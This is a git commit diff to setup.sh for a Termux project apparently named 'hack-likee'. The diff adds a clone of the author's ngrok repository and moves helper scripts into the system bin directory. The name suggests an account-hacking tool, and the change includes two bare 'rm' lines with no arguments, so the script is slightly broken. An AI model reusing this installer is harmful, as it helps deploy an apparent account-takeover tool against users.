0f4fcafbf1f27f9b1b58479b25fd6b914c794fb5
Fazle Rabbi <71178740+fh-rabbi@users.noreply.github.com>
2021-01-12 16:39:24 +0600

    Update setup.sh

--- setup.sh
+++ setup.sh
@@ -1,6 +1,11 @@
 clear
 sleep 1.0
 pkg install php -y
+cd $HOME
+git clone https://github.com/fh-rabbi/ngrok
+cd $HOME
+rm
+rm
 cd $HOME/hack-likee
 mv pw /data/data/com.termux/files/usr/bin
 mv start-hl /data/data/com.termux/files/usr/bin
